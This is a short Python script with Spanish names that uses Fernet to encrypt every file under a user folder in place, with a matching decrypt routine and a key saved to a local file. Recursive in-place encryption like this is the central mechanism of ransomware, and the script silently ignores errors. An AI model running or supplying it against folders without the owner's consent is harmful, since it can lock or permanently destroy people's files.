import os
from cryptography.fernet import Fernet

def generar_clave(path="clave.key"):
    clave = Fernet.generate_key()
    with open(path, "wb") as f:
        f.write(clave)
    return clave

def cargar_clave(path="clave.key"):
    with open(path, "rb") as f:
        return f.read()

def encriptar_carpeta(clave, carpeta_usuario):
    fernet = Fernet(clave)
    for dirpath, _, archivos in os.walk(carpeta_usuario):
        for nombre_archivo in archivos:
            ruta = os.path.join(dirpath, nombre_archivo)
            if os.path.isfile(ruta):
                try:
                    with open(ruta, "rb") as file:
                        datos = file.read()
                    datos_enc = fernet.encrypt(datos)
                    with open(ruta, "wb") as file:
                        file.write(datos_enc)
                except Exception:
                    pass

def desencriptar_carpeta(clave, carpeta_usuario):
    fernet = Fernet(clave)
    for dirpath, _, archivos in os.walk(carpeta_usuario):
        for nombre_archivo in archivos:
            ruta = os.path.join(dirpath, nombre_archivo)
            if os.path.isfile(ruta):
                try:
                    with open(ruta, "rb") as file:
                        datos = file.read()
                    datos_dec = fernet.decrypt(datos)
                    with open(ruta, "wb") as file:
                        file.write(datos_dec)
                except Exception:
                    pass
